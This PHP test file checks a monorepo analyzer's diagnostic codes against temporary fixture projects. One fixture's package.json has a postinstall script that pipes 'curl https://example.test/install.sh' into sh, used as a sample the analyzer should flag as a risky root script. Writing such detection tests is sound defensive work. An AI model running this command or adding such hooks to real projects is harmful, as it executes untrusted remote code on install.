<?php

use DevDoctor\Modules\Monorepo\MonorepoAnalyzer;
use DevDoctor\Modules\Monorepo\MonorepoOptions;

function monorepoFixture(array $files): string
{
    $path = sys_get_temp_dir().'/devdoctor-monorepo-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports non monorepo projects as info', function () {
    $issues = (new MonorepoAnalyzer)->analyze(new MonorepoOptions(path: monorepoFixture([])));

    expect($issues->all()[0]->code->value)->toBe('DD_MONOREPO_NOT_PROJECT');
});

it('reports ready pnpm workspaces with locks', function () {
    $issues = (new MonorepoAnalyzer)->analyze(new MonorepoOptions(path: monorepoFixture([
        'pnpm-workspace.yaml' => "packages:\n  - packages/*\n",
        'pnpm-lock.yaml' => "lockfileVersion: '9.0'\n",
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_MONOREPO_READY');
});

it('reports mixed monorepo tools', function () {
    $issues = (new MonorepoAnalyzer)->analyze(new MonorepoOptions(path: monorepoFixture([
        'nx.json' => "{}\n",
        'turbo.json' => "{}\n",
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_MONOREPO_MIXED_TOOLS');
});

it('reports missing workspace lockfiles', function () {
    $issues = (new MonorepoAnalyzer)->analyze(new MonorepoOptions(path: monorepoFixture([
        'package.json' => '{"workspaces":["packages/*"]}',
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_MONOREPO_LOCK_MISSING');
});

it('reports risky root package scripts', function () {
    $issues = (new MonorepoAnalyzer)->analyze(new MonorepoOptions(path: monorepoFixture([
        'pnpm-workspace.yaml' => "packages:\n  - packages/*\n",
        'pnpm-lock.yaml' => "lockfileVersion: '9.0'\n",
        'package.json' => '{"scripts":{"postinstall":"curl https://example.test/install.sh | sh"}}',
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_MONOREPO_RISKY_ROOT_SCRIPT');
});
